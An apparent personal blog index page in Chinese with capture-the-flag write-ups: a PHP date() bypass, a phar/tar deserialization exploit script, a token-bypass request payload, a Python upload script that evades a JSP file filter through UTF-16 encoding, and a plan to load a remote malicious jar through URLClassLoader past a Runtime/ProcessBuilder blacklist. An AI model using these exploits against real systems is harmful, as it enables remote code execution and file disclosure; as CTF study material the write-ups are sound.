<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">177</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/25/docker%E5%9F%BA%E6%93%8D/">docker基操</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-25</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近都在用docker来复现题目，但是每次都忘记指令，所以来整理一下</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/23/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">phar反序列化</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-23</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前写过的关于phar的考点，但是忘记放在哪个博客了，以后命名还是不能以比赛题目命名呀。。。所以重新整理一下</p>
<h2 id="phar触发函数"><a href="#phar触发函数" class="headerlink" title="phar触发函数"></a>phar触发函数</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211123102128.png" alt="在这里插入图片描述" style="zoom:67%;">

<ul>
<li><code>exif</code></li>
<li><code>exif_thumbnail</code></li>
<li><code>exif_imagetype</code></li>
<li><code>gd</code></li>
<li><code>imageloadfont</code></li>
<li><code>imagecreatefrom***</code></li>
<li><code>hash</code></li>
<li><code>hash_hmac_file</code></li>
<li><code>hash_file</code></li>
<li><code>hash_update_file</code></li>
<li><code>md5_file</code></li>
<li><code>sha1_file</code></li>
<li><code>file / url</code></li>
<li><code>get_meta_tags</code></li>
<li><code>get_headers</code></li>
<li><code>standard</code></li>
<li><code>getimagesize</code></li>
<li><code>getimagesizefromstringfinfo_file/finfo_buffer/mime_content_type</code></li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/22/2021nu1lctf/">2021nu1lctf</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-22</time><div class="content"><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is /flag</span></span><br><span class="line">$path=$_POST[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">$time=(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;time&#x27;</span>])) ? urldecode(date(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>))) : date(<span class="string">&quot;Y/m/d H:i:s&quot;</span>);</span><br><span class="line">$name=<span class="string">&quot;D:\apache\www\nu1l\\&quot;</span>.time().rand().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">$black=<span class="string">&quot;f|ht|ba|z|ro|;|,|=|g|da|_&quot;</span>;</span><br><span class="line">$blist=explode(<span class="string">&quot;|&quot;</span>,$black);</span><br><span class="line"><span class="keyword">foreach</span>($blist <span class="keyword">as</span> $b)&#123;</span><br><span class="line">    <span class="keyword">if</span>(strpos($path,$b) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;111&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(file_put_contents($name, $time))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre class=&#x27;language-html&#x27;&gt;&lt;code class=&#x27;language-html&#x27;&gt;logpath:<span class="subst">$name</span>&lt;/code&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$check=preg_replace(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,file_get_contents($path));</span><br><span class="line"><span class="keyword">if</span>(is_file($check))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre class=&#x27;language-html&#x27;&gt;&lt;code class=&#x27;language-html&#x27;&gt;&quot;</span>.file_get_contents($check).<span class="string">&quot;&lt;/code&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>考点主要在于绕过date的混淆，查阅了一下文档，发现加了反斜杠以后不会被date函数给处理，所以可以直接输入<code>///f/a/l/g</code>存入log中即为/flag，后面又会log文件里面读出值，然后从file_get_content中读取/flag的值，即可拿到flag</p>
<h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p><code>考点</code></p>
<p>phar反序列化，但是重点在于如何绕过脏字符</p>
<p>首先我们需要触发的入口在哪里，只有这里包含了flag.php，并且存在file_exists而且file是可控的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">include_once &quot;log.php&quot;;</span><br><span class="line"></span><br><span class="line">if(file_exists(@$_GET[&quot;file&quot;]))&#123;</span><br><span class="line">    echo &quot;file exist!&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;file not exist!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这也就是意味着，我们在log.php那边写入文件，在index.php那里读</p>
<p>首先我们需要理清楚触发phar的条件是否都可以具备？，最大的问题在于这里，phar文件要求，他是需要后四位必须为GBMB作为签名来识别的，但是可以发现，我们写入的内容后四位会被没法是GBMB</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$log &#x3D; &#39;Time: &#39; . date(&#39;Y-m-d H:i:s&#39;) . &#39; IP: [&#39; . @$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] . &#39;], REQUEST: [&#39; . $gets . &#39;], CONTENT: [&#39; . file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;) . &quot;]\n&quot;;</span><br><span class="line">$log_file &#x3D; $log_ip_dir . &#39;&#x2F;&#39; . $log_type . &#39;_www.log&#39;;</span><br><span class="line"></span><br><span class="line">file_put_contents($log_file, $log, FILE_APPEND);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以这里就需要换一种思路来解决了，phar://可以反序列化的文件有zip, tar, phar，zip的文件更加严格了，似乎不是直接创建就可以的–，大概原因是他是压缩文件格式吧，我们分别测试一下看看哪一种不会因为脏字符文件尾而导致反序列化失败，分别对phar和tar输出他们文件内容:</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211124225947.png" alt="img" style="zoom:67%;">

<p>可以发现phar文件的文件尾是GBMB，接下来我们针对测试一下修改文件后缀、文件尾、文件头试试<br><code>1.文件头</code><br>格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。并且在php当中生成phar文件的时候，这部分内容无法更改，更改以后将无法正确生成phar文件，但其实在本题当中没多大影响，因为生成phar文件的时候，这个头是连接序列化内容一起写入的，不会被打断，并且&lt;?php前面有什么内容都没有影响</p>
<p><code>2.文件尾</code><br>文件尾需要GBMB结尾，可以发现，如果被截断的话，将无法正确读取<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211124230839.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211124230850.png" alt="img" style="zoom:67%;"></p>
<p>那么接下来的思路就是构建tar文件，进行phar反序列化了</p>
<h3 id="构建tar文件"><a href="#构建tar文件" class="headerlink" title="构建tar文件"></a>构建tar文件</h3><p>这里直接N1的题解脚本了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">CLASS</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="comment">//private $_flag;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;FLAG: &quot;</span> . <span class="keyword">$this</span>-&gt;_flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ip = <span class="string">&quot;172.17.0.1&quot;</span>;</span><br><span class="line">$log = <span class="string">&#x27;Time: &#x27;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>) . <span class="string">&#x27; IP: [&#x27;</span> . $ip . <span class="string">&#x27;], REQUEST: [], CONTENT: [&#x27;</span>;</span><br><span class="line">$data_len = strlen($log);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">&quot;./phar.tar&quot;</span>))&#123;</span><br><span class="line">    $phar = <span class="keyword">new</span> PharData(dirname(<span class="keyword">__FILE__</span>) . <span class="string">&quot;/phar.tar&quot;</span>, <span class="number">0</span>, <span class="string">&quot;phartest&quot;</span>, Phar::TAR);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $o = <span class="keyword">new</span> FLAG();</span><br><span class="line">    $phar-&gt;setMetadata($o);</span><br><span class="line">    $phar-&gt;addFromString($log, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">    file_put_contents(<span class="string">&quot;./phar.tar&quot;</span>, <span class="string">&quot;]\n&quot;</span>, FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = file_get_contents(<span class="string">&quot;./phar.tar&quot;</span>);</span><br><span class="line">$post_exp = substr($exp, $data_len);</span><br><span class="line"><span class="keyword">echo</span> $post_exp;</span><br><span class="line"><span class="keyword">echo</span> rawurlencode($post_exp);</span><br></pre></td></tr></table></figure>

<p>这个是它的内容<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211124231814.png" alt="img" style="zoom:67%;"><br>观察一下tar文件里面的情况<br> 可以发现是文件名为log</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/16/2021%E6%B7%B1%E8%82%B2%E6%9D%AF/">2021深育杯</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-16</time><div class="content"><h2 id="weblog"><a href="#weblog" class="headerlink" title="weblog"></a>weblog</h2></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/14/2021l3ctf/">2021l3ctf</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-14</time><div class="content"><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>送分题<br>发现password没那么短，双击复制一下，然后urlencode</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="string">&quot;‮⁦L3H⁩⁦password&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="string">&quot;‮⁦CTF⁩⁦l3hctf&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来发送即可</p>
<h2 id="image-service1"><a href="#image-service1" class="headerlink" title="image-service1"></a>image-service1</h2><p>share图片，注册了一下，发现a可以share到b的，然后admin不让注册，也不让share，但是试了一下，发现ADMIN也同样可以share到。。。</p>
<h2 id="image-service2"><a href="#image-service2" class="headerlink" title="image-service2"></a>image-service2</h2><p>看了半天，要想读到flag2就需要更改blur参数还有x，但是直接改的话，会说token不存在，所以觉得还是应该看看参数和uuid的关系是啥样的，正好附件里面有docker文件，起一个docker看看，正好学习一下如何弄这个玩意：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考链接：https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1169085</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">up  安装组下的容器集合默认的yml的文件名称是当前目录下的docker-compose.yml，如果需要指定：</span><br><span class="line">docker-compose -f 文件名 up</span><br><span class="line">docker-compose up -d 后台运行不显示日志pwd</span><br><span class="line">curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;daotools&#x2F;set_mirror.sh | sh -s http:&#x2F;&#x2F;b81aace9.m.daocloud.io</span><br><span class="line">sudo docker-compose -f docker-compose.yml up </span><br></pre></td></tr></table></figure>

 <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211114195140.png" alt="img" style="zoom:67%;">
需要注意的是，在配置env的时候，需要更改一些参数，踩坑主要也是在loc需要配置为你的服务器ip地址，但是在这里不知道为啥这样也起不了，但是1002的端口可以开启，所以就直接用了，这里确实没想到，其实直接查看docker的日志，看看get那边的值是如何传入的就行了，如何才能做到tooken一致

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211116175752.png" alt="img"></p>
<p>对比一下</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211116175751.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211116180049.png" alt="img"></p>
<p>首先我发了两次blur=20的 发现他们的tooken都是一样的，如下所示，当我更改值以后，他们的tooken就发生改变了，可以看到标黄的那段，那么要如何绕过呢，可以看到他经过了一个map处理，猜想这里的map是对里面的值进行计算然后得到一个tooken，那么如果我们可以做到输入blur:[20]在实际中其实又没有这个值，那就可以绕过了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">image-service-nginx-<span class="number">1</span>    | <span class="number">211.97</span>.<span class="number">128.174</span> - - [<span class="number">16</span>/Nov/<span class="number">2021</span>:<span class="number">09</span>:<span class="number">59</span>:<span class="number">50</span> +<span class="number">0000</span>] <span class="string">&quot;GET /get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200 HTTP/1.1&quot;</span> <span class="number">403</span> <span class="number">25</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | map[blur:[<span class="number">20</span>] text:[secret] textsize:[<span class="number">50</span>] uuid:[<span class="number">4</span>bb2c93b-b18f-<span class="number">42f</span>c-<span class="number">97f</span>c-ec5a3afbab64] x1:[<span class="number">200</span>] y1:[<span class="number">200</span>]]</span><br><span class="line">image-service-service-<span class="number">1</span>  | <span class="comment">//c45fe4fc97e10d46273f8ab3a04233a313e2403e6fdf33bd1b4ab5fd24cc6bf1 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | [GIN] <span class="number">2021</span>/<span class="number">11</span>/<span class="number">16</span> - <span class="number">09</span>:<span class="number">59</span>:<span class="number">50</span> | <span class="number">403</span> |      <span class="number">62.594</span>µs |      <span class="number">172.18</span>.<span class="number">0.2</span> | GET      <span class="string">&quot;/get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">image-service-nginx-<span class="number">1</span>    | <span class="number">211.97</span>.<span class="number">128.174</span> - - [<span class="number">16</span>/Nov/<span class="number">2021</span>:<span class="number">10</span>:<span class="number">05</span>:<span class="number">42</span> +<span class="number">0000</span>] <span class="string">&quot;GET /get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200 HTTP/1.1&quot;</span> <span class="number">403</span> <span class="number">25</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | map[blur:[<span class="number">20</span>] text:[secret] textsize:[<span class="number">50</span>] uuid:[<span class="number">4</span>bb2c93b-b18f-<span class="number">42f</span>c-<span class="number">97f</span>c-ec5a3afbab64] x1:[<span class="number">200</span>] y1:[<span class="number">200</span>]]</span><br><span class="line">image-service-service-<span class="number">1</span>  | <span class="comment">//c45fe4fc97e10d46273f8ab3a04233a313e2403e6fdf33bd1b4ab5fd24cc6bf1 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | [GIN] <span class="number">2021</span>/<span class="number">11</span>/<span class="number">16</span> - <span class="number">10</span>:<span class="number">05</span>:<span class="number">42</span> | <span class="number">403</span> |      <span class="number">65.684</span>µs |      <span class="number">172.18</span>.<span class="number">0.2</span> | GET      <span class="string">&quot;/get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">211.97</span>.<span class="number">128.174</span> - - [<span class="number">16</span>/Nov/<span class="number">2021</span>:<span class="number">10</span>:<span class="number">07</span>:<span class="number">26</span> +<span class="number">0000</span>] <span class="string">&quot;GET /get?blur=0&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=0&amp;y1=200 HTTP/1.1&quot;</span> <span class="number">403</span> <span class="number">25</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | map[blur:[<span class="number">0</span>] text:[secret] textsize:[<span class="number">50</span>] uuid:[<span class="number">4</span>bb2c93b-b18f-<span class="number">42f</span>c-<span class="number">97f</span>c-ec5a3afbab64] x1:[<span class="number">0</span>] y1:[<span class="number">200</span>]]</span><br><span class="line">image-service-service-<span class="number">1</span>  | <span class="comment">//6c73f2e8bb98f6d40cc95e9d716a126e2fc6c320322df005cb1532c4a9ff3043 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | [GIN] <span class="number">2021</span>/<span class="number">11</span>/<span class="number">16</span> - <span class="number">10</span>:<span class="number">07</span>:<span class="number">26</span> | <span class="number">403</span> |      <span class="number">94.621</span>µs |      <span class="number">172.18</span>.<span class="number">0.2</span> | GET      <span class="string">&quot;/get?blur=0&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=0&amp;y1=200&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="number">211.97</span>.<span class="number">128.174</span> - - [<span class="number">16</span>/Nov/<span class="number">2021</span>:<span class="number">10</span>:<span class="number">14</span>:<span class="number">55</span> +<span class="number">0000</span>] <span class="string">&quot;GET /get?blur:[20]%20text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1:[200]%20y1=200 HTTP/1.1&quot;</span> <span class="number">403</span> <span class="number">25</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | map[blur:[<span class="number">20</span>] text:[secret] textsize:[<span class="number">50</span>] uuid:[<span class="number">4</span>bb2c93b-b18f-<span class="number">42f</span>c-<span class="number">97f</span>c-ec5a3afbab64] x1:[<span class="number">200</span>] y1:[<span class="number">200</span>]]</span><br><span class="line">image-service-service-<span class="number">1</span>  | <span class="comment">//c45fe4fc97e10d46273f8ab3a04233a313e2403e6fdf33bd1b4ab5fd24cc6bf1 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | [GIN] <span class="number">2021</span>/<span class="number">11</span>/<span class="number">16</span> - <span class="number">10</span>:<span class="number">14</span>:<span class="number">55</span> | <span class="number">403</span> |      <span class="number">68.117</span>µs |      <span class="number">172.18</span>.<span class="number">0.2</span> | GET      <span class="string">&quot;/get?blur:[20]%20text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1:[200]%20y1=200&quot;</span></span><br></pre></td></tr></table></figure>

<p>可以看到最终的tooken和一开始输入blur20的是一样的，但是tooken没有发生改变，所以最终的payload是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get?blur:[20] text&#x3D;secret&amp;textsize&#x3D;50&amp;token&#x3D;61cb06c63c5fb86303c40f4bfd2ea04aa9d7cf3067f8f886c8b30f4e547bc803&amp;uuid&#x3D;1293b342-b144-42ec-983d-96fba7c159b9&amp;x1:[200] y1&#x3D;200</span><br></pre></td></tr></table></figure>

<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>一开始是文件后缀绕过，直接双写就可以了，问题在于后续正则匹配的绕过，这里提到，不能输入两个连续的字符串</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkValidChars</span><span class="params">(String content)</span> </span>&#123;</span><br><span class="line">    Pattern pattern = Pattern.compile(<span class="string">&quot;[a-zA-Z0-9]&#123;2,&#125;&quot;</span>);</span><br><span class="line">    Matcher matcher = pattern.matcher(content);</span><br><span class="line">    <span class="keyword">return</span> matcher.find();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一开始是定位这里，看这个getString是否有什么特性，后面是没发现的，只知道他是将其作为string读入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String content = item.getString();</span><br></pre></td></tr></table></figure>

<p>感觉之前的大师傅离成功应该是只有一步之遥了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.当form中设置method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;时才能正常上传。</span><br><span class="line">2.commons-fileupload上传中如果form中的参数有中文，此时用item.getString()会出现乱码，必须用item.getString(&quot;UTF-8&quot;)，UTF-8为编码方式。</span><br><span class="line"></span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;pg_guo&#x2F;article&#x2F;details&#x2F;8753449</span><br></pre></td></tr></table></figure>

<p>通过测试，我们可以发现，他是没有过滤汉字，那么汉字乱码肯定是可以绕过的，那我们就对文本使用其他编码形式，比如说当utf-16的文本，以utf-8的形式打开，那肯定是会变成乱码的，根据这个思路，就可以绕过了，写一个自动化脚本（已经有大师傅写过了）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_op</span>(<span class="params">filename,filedata</span>):</span></span><br><span class="line">    print(<span class="string">&quot;filename: &quot;</span>,filename)</span><br><span class="line">    print(<span class="string">&quot;filedata: &quot;</span>, filedata)</span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(filedata)</span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://123.60.20.221:10001/UploadServlet&#x27;</span>, files=&#123;<span class="string">&quot;filename&quot;</span>: open(filename, <span class="string">&quot;rb&quot;</span>)&#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;文件上传成功! 文件路径: /usr&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        url = <span class="string">&quot;http://123.60.20.221:10001/&quot;</span> + r.text.replace(</span><br><span class="line">            <span class="string">&quot;文件上传成功! 文件路径: /usr/local/apache-tomcat-8.5.72/webapps/ROOT/&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(url)</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        print(r.text)</span><br><span class="line">        print(r.content)</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    filename=<span class="string">&quot;1.jjspsp&quot;</span></span><br><span class="line">    filedata=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">    file_op(filename,filedata)</span><br></pre></td></tr></table></figure>

<p>接下来就是绕过第二个黑名单，里面过滤了很多内容，在寻找绕过方式的时候，看到了很多有意思的方法，决定收藏一下，这里说一下Y4大师傅的解题方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;f5.pm&#x2F;go-61281.html</span><br></pre></td></tr></table></figure>

<p>他的黑名单实在多：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">黑名单Runtime、\u、ScriptEngine、newInstance、ProcessBuilder、invoke、File、defineClass、lookup，JdbcRowSetImpl等</span><br></pre></td></tr></table></figure>

<p>然后再次佩服一下大师傅们，太牛了，这里用到的方法是，使用UrlClassLoader与Class.forName在初始化对象时执行命令，首先学习下这两个包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UrlClassLoader:URLClassLoader 可以加载远程类库和本地路径的类库</span><br><span class="line">#其实昨晚在做的时候有看到这个思路，但是当时发现有用到newInstance，所以就没往下继续想了，有点可惜</span><br><span class="line">Class.forName：装载一个类并且对其进行实例化的操作，装载过程中使用到的类加载器是当前类</span><br><span class="line">			Class.forName(xxx.xx.xx)返回的是一个类。Class.forName(xxx.xx.xx)的作用是要求JVM查找并加载指定的类，也就是说JVM会执行该类的静态代码段</span><br><span class="line">这里说说自己的理解:class.forname其实就是生成这个类的class</span><br></pre></td></tr></table></figure>

<p>首先写一个恶意类，并打包jar上传服务器，这里在学习一下了，如何创建一个jar包。。。<br><a target="_blank" rel="noopener" href="https://www.hangge.com/blog/cache/detail_2750.html">https://www.hangge.com/blog/cache/detail_2750.html</a></p>
<p>贴一下恶意包的代码:</p>
